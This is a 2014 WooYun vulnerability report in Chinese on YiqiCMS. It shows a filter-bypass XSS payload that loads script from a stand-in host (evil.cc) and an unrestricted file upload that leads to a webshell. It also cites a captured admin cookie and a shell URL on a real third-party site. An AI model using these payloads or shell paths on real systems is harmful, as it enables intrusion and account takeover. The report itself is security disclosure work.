{"id": 48648, "wybug_id": "wooyun-2014-077026", "wybug_title": "某开源CMS绕过过滤XSS盲打+getshell（伟哥，少林寺官网中枪）", "wybug_corp": "易企内容管理系统", "wybug_author": "Haswell", "wybug_date": "2014-09-23 08:42", "wybug_open_date": "2014-12-22 08:44", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-23：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-12-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 好久没前台过了。。。。Powered by YIQICMS“百度为您找到相关结果约17200个”伟哥官网中枪 详细说明：  最新版1.8，首先关注/comment.php:\nif($action == \"save\"){    $msgtitle = $_POST[\"msgtitle\"];    $msgname = $_POST[\"msgname\"];    $msgcontact = $_POST[\"msgcontact\"];    $msgcontent = $_POST[\"msgcontent\"];        ................................................            $msgcontent = safeCheck($msgcontent);        $userip = $_SERVER[\"REMOTE_ADDR\"];;\t$sql = \"INSERT INTO yiqi_comments (cid ,title ,name,contact,content,ip,adddate)\" .\t\t   \"VALUES (NULL, '$msgtitle', '$msgname', '$msgcontact','$msgcontent', '$userip', null)\";\t$result = $yiqi_db->query(CheckSql($sql));\tif($result == 1)\t{\t    ShowMsg(\"留言添加成功\");\t}\n我们看到了safecheck函数，但是明显只对content进行了调用，于是留言的标题变成了一处xss.但是30个字符限制确是鸡肋，于是我们关注safecheck函数。/include/common.func.php\nfunction safeCheck($str) {     $farr = array(        \"/<(\\/?)(script|i?frame|style|html|body|title|link|meta|\\?|\\%)([^>]*?)>/isU\",  //过滤 <script 等可能引入恶意内容或恶意改变显示布局的代码,如果不需要插入flash等,还可以加入<object的过滤         \"/(<[^>]*)on[a-zA-Z]+\\s*=([^>]*>)/isU\",                                      //过滤javascript的on事件          );    $tarr = array(        \"\",         \"\",    );   $str = preg_replace($farr,$tarr,$str);    return $str; }\n看到这里想必大家都懂了天啊噜这不是常出现的<scr<script>ipt>绕过吗于是构造<scr<script>ipt src=http://evil.cc/evil.js></scr<script>ipt>  \n\n在数据被取出时并未进行转义操作/admin/comments.php\n$cid = $_GET[\"cid\"];$cid = (isset($cid) && is_numeric($cid)) ? $cid : 0;$commentdata = new Comments;$commentinfo = $commentdata->GetComment($cid);.......<tr><td class=\"label\">留言内容</td><td class=\"input\"><?php echo $commentinfo->content;?></td></tr>\n于是后台的景象\n\n恶意js被加载\n\n至此便是盲打后台，接下来是getshell很幸运地找到了一处可以上传东西的地方\n\n接下来看admin/product-add.php\nif(!empty($_FILES[\"productthumb\"][\"name\"]))\t{\t    require_once(\"../include/upload.class.php\");\t    $filedirectory = YIQIROOT.\"/uploads/image\";\t    $filename = date(\"ymdhis\");\t    $filetype = $_FILES['productthumb']['type'];\t    $upload = new Upload;\t    $upload->set_max_size(1800000); \t    $upload->set_directory($filedirectory);\t    $upload->set_tmp_name($_FILES['productthumb']['tmp_name']);\t    $upload->set_file_size($_FILES['productthumb']['size']);\t    $upload->set_file_ext($_FILES['productthumb']['name']); \t    $upload->set_file_type($filetype); \t    $upload->set_file_name($filename); \t    \t    $upload->start_copy(); \t    \t    if($upload->is_ok())\t    {\t        $productthumb = YIQIPATH.\"uploads/image/\".$filename.'.'.$upload->user_file_ext;\t    }\t    else\t    {\t        exit($upload->error());\t    }\t}\n并没有进行类型限制，看到$filename = date(\"ymdhis\");可以直接抓下包，文件名就是ymdhis。如果嫌麻烦，还可以回到前台，直接得到shell地址\n\ngetshell\n\n当然，因为此处未作CSRF限制，所以可以直接XSRF getshell.   漏洞证明：  \n\n\n\n拿来实验的少林寺官网cookie\n\nshellhttp://www.shaolinsiyuan.com/include/Smarty/libs/plugins/function.config.php   修复方案：  健全过滤机制限制上传类型   版权声明：转载请注明来源 Haswell@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-09-24 00:36 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  杜蕾斯中枪了吗    \n     2014-09-24 08:11 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:7        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区欢迎您...)\t\t \n  如果以非通用漏洞提交 少林寺网站存在XSS+getshell 更吸引眼球 只是没奖金了    \n     2014-12-22 09:22 |    \t\tCh丶0nly \t\t\t( 普通白帽子  |\t\t\t        Rank:205 漏洞数:50        | 专注网络30年。)\t\t \n  还是鸡肋了点    \n     2014-12-22 10:39 |    \t\tObserver \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:8        | 我在夕阳下奔跑，那是我逝去的青春)\t\t \n  标题： 看我如何把伟哥和少林寺联系起来的    \n     2014-12-22 10:58 |    \t\t卡卡更健康 \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:14        )\t\t \n  少林寺和尚吃了伟哥，一根少林火腿肠，两颗大力金刚丸，合体双修佛法扬。    \n     2014-12-22 13:14 |    \t\tObserver \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:8        | 我在夕阳下奔跑，那是我逝去的青春)\t\t \n  标题： 看我如何把伟哥和少林寺联系起来的    \n     2014-12-22 19:07 |    \t\t咖啡 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:20        )\t\t \n  释永信：感谢施主提交，马上修复    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}